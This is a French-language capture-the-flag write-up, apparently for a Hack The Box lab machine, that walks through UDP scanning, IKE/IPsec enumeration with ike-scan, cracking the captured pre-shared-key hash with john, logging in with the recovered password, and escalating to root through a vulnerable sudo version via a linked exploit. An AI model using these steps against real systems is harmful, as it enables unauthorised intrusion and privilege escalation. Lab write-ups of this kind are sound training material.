Le scan nmap de base ne détecte que le 22 ( ssh ) d'ouvert sur la machine
Pour trouver les autres il faudra passer par un scan UDP avec la commande : 
	nmap -sU 10.129.95.120 -v (Pour les 1000 premiers)
	nmap -sU -A -p500 10.129.95.120 -v (Pour les infroamtions du port 500)
	nmap -sU -p- 10.129.95.120 -v (Pour tous les ports, mais trèssssssss long)



On trouve alors le port 500 -> ISAKMP
https://book.hacktricks.wiki/fr/network-services-pentesting/ipsec-ike-vpn-pentesting.html
	ike-scan -M 10.129.95.120

dans la réponse ( derniere ligne) on les valeurs 1 et 0
Cela signifie que la cible est configurée pour IPsec et est prête à effectuer une négociation IKE, et qu'un ou plusieurs des transformations que vous avez proposées sont acceptables (une transformation valide sera affichée dans la sortie).


avec la commande 
	ike-scan -A 10.129.95.120
on l'ID  : 
	ike@expressway.htb	


On peut donc capturer et cracker le hash
	ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP>
	ike-scan -M -A -n ike@expressway.htb --pskcrack=hash.txt 10.129.95.120


On obtient alors le hasht dans un fichier __hash.txt__
Pour le cracker on va utiliser john, en premier lieu on va faire le script :
	https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py
	python3 ikescan2john.py hash.txt > hash.john
	john --wordlist=/usr/share/wordlists/rockyou.txt hash.john

On trove le mot de passe :
	freakingrockstarontheroad


On peut utiliser les login et mots de passe suivant pour se connecter :
	login: ike
	password: freakingrockstarontheroad 



Une fois connecter le flag est dans le fichier user.txt




Pour l'acces root, on ne peut pas executer de commande en tant que root
On peut verifier si la versionde sudo est vulnérable : 
	sudo -V
	Sudo version 1.9.17

Effectivement la version de sudo est vulnérable 2025-32463.
	https://github.com/KaiHT-Ladiant/CVE-2025-32463/blob/main/cve-2025-32463.sh	
